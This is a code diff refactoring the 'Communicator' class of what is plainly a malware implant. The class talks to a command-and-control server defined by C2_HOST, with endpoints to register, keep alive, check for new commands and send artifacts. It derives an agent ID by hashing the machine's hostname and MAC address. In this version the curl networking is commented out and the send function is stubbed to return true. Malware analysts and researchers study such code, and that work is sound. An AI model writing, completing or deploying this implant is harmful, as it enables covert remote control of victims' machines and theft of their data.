@@ -1,12 +1,15 @@
+#pragma once
+
 #include <iostream>
 #include <string>
 #include <mutex>
-#include "include/curl"
-#include "include/nlohmann/json.hpp"
-#include "Utils/crypto_utils.h"
-#include "Utils/machine_utils.h"
+//#include "../include/curl"
+#include "../include/json.hpp"
+#include "../Utils/CryptoUtils.h"
+#include "../Utils/MachineUtils.h"
 
 using json = nlohmann::json;
+
 
 #define C2_HOST "http://127.0.0.1:1234"
 #define REGISTER_URI C2_HOST"/c2/register"
@@ -14,11 +17,11 @@ using json = nlohmann::json;
 #define KEEP_ALIVE_URI C2_HOST"/c2/ping"
 #define SEND_ARTIFACT C2_HOST"/c2/send_artifact"
 
-class communicator
+class Communicator
 {
 private:
     std::string client_id;
-    CURL * curl;
+    // CURL * curl;
     std::mutex curl_mtx;
 
     static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
@@ -28,7 +31,7 @@ private:
 
     bool send_request_safe(std::string uri, const json & payload, json * response_ptr, bool post=true)
     {
-        std::lock_guard<std::mutex> lock(curl_mtx);
+        /*std::lock_guard<std::mutex> lock(curl_mtx);
         std::string response_buf
         long resp_code;
         curl = curl_easy_init();
@@ -74,6 +77,10 @@ private:
         curl_easy_cleanup(curl);
 
         return response_buf.size() || resp_code == 200;
+        
+        */
+
+       return true;
     }
     
     void keep_alive()
@@ -84,55 +91,55 @@ private:
         send_request_safe(KEEP_ALIVE_URI, payload_client_id, &response);
     }
 
-    communicator() {
+    Communicator() {
         if (!init())
         {
             throw std::runtime_error("Can't init communicator");
         }
-    };
+    }
 
     void generate_agent_id()
     {
-        std::string hostname = machine_utils::get_host_name();
-        std::string macaddr = machine_utils::get_mac_address();
-        std::stringstream ss = hostname << "-" << macaddr;>
-        client_id = crypto_utils::md5(ss.str());
+	    std::string hostname = MachineUtils::get_host_name();
+        std::string macaddr = MachineUtils::get_mac_address();
+        std::stringstream ss(hostname);
+        ss << "-" << macaddr;
+        client_id = CryptoUtils::md5(ss.str());
     }
 
     bool init()
     {
         generate_agent_id();
-        return curl_global_init(CURL_GLOBAL_DEFAULT);
+        return true;//curl_global_init(CURL_GLOBAL_DEFAULT);
 
     }
 
 public:
     
-    static communicator& getInstance() {
-        static communicator instance; 
+    static Communicator& getInstance() {
+        static Communicator instance;
         return instance;
     }
     
-    communicator(const communicator&) = delete;
-    communicator& operator=(const communicator&) = delete;
+    Communicator(const Communicator&) = delete;
+    Communicator& operator=(const Communicator&) = delete;
 
-    ~communicator() {
-        curl_easy_cleanup();
-        curl_global_cleanup();
+    ~Communicator() {
+        // curl_easy_cleanup();
+        // curl_global_cleanup();
     }
 
-    json check_new_command()
+    bool check_new_command(json * cmd)
     {
-        json response;
-        return send_request_safe(CHECK_NEW_CMD_URI, NULL, &response);
+        return send_request_safe(CHECK_NEW_CMD_URI, NULL, cmd);
     }
 
     bool c2_registration()
     {
         json response;
         json registration_payload;
-        registration_payload["client_id": client_id];
-        return send_request_safe(CHECK_NEW_CMD_URI, registration_payload, &response) || respose["status"] == 0;
+        registration_payload["client_id"] = client_id;
+        return send_request_safe(CHECK_NEW_CMD_URI, registration_payload, &response) || response["status"] == 0;
     }
 
     void send_artifact(const json & payload)
@@ -141,4 +148,3 @@ public:
         send_request_safe(SEND_ARTIFACT, payload, &response);
     }
 };
-
